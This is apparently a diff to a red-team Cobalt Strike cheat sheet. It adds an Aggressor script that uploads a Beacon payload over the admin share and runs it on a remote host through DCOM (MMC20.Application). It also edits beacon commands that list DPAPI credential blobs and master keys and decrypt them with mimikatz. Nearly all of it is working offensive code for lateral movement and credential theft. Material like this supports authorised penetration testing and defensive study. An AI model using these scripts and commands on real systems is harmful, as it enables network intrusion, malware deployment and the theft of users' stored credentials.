@@ -90,6 +90,40 @@ Make any traffic hitting port **8080** on Victim to be redirected to **localhost
 beacon> rportfwd_local 8080 127.0.0.1 80
 ```
 
+Extending `jump` with [Invoke-DCOM.ps1](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/lateral_movement/Invoke-DCOM.ps1):
+
+```powershell
+sub invoke_dcom
+{
+    local('$handle $script $oneliner $payload');
+
+    # acknowledge this command1
+    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
+
+    # read in the script
+    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+
+    # host the script in Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    # generate stageless payload
+    $payload = artifact_payload($3, "exe", "x64");
+
+    # upload to the target
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
+
+    # run via this powerpick
+    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
+
+    # link if p2p beacon
+    beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
+```
+
 
 
 
@@ -102,7 +136,7 @@ beacon> rportfwd_local 8080 127.0.0.1 80
 List credential blobs:
 
 ```
-beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
+beacon> ls C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials
 ```
 
 List vault credentials:
@@ -121,7 +155,7 @@ beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Cre
 The master key is stored here:
 
 ```
-beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>
+beacon> ls C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID>
 ```
 
 Decrypt the master key via RPC on the Domain Controller and show it:
